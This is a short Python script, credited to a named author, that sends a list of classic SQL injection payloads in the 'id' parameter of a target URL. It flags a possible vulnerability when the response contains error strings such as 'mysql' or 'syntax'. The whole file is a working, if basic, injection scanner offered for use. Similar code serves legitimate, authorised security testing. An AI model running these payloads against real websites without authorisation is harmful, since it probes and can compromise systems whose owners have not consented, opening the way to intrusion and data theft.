
import requests
# Don't copy this script. This script is developed by Tawfique Elahey
# List of common SQL injection payloads
# This is a basic sql that can help users to find basic information of a normal website.
sql_injection_payloads = [
    "' OR 1=1 --", 
    "' OR 'a'='a", 
    "' OR 1=1#",
    '" OR "a"="a',
    "' UNION SELECT NULL, NULL, NULL --",
    "' AND 1=1 --",
    "' AND 1=1#"
]

# Function to test for SQL injection vulnerabilities
def test_sql_injection(url):
    for payload in sql_injection_payloads:
        # Construct the URL with the payload (assuming the parameter is named 'id')
        injection_url = f"{url}?id={payload}"
        
        # Send GET request with the payload
        try:
            response = requests.get(injection_url)
            
            # Check if the response contains potential signs of SQL injection
            if "error" in response.text or "mysql" in response.text or "syntax" in response.text:
                print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
                print(f"Response: {response.text[:200]}...")  # Print the first 200 characters of the response
            else:
                print(f"No vulnerability detected with payload: {payload}")
        except Exception as e:
            print(f"Error testing {injection_url}: {e}")

# Test the function
url_to_test = 'http://example.com/vulnerable_page'
test_sql_injection(url_to_test)
print("This script is developed by Md Tawfique Elahey")
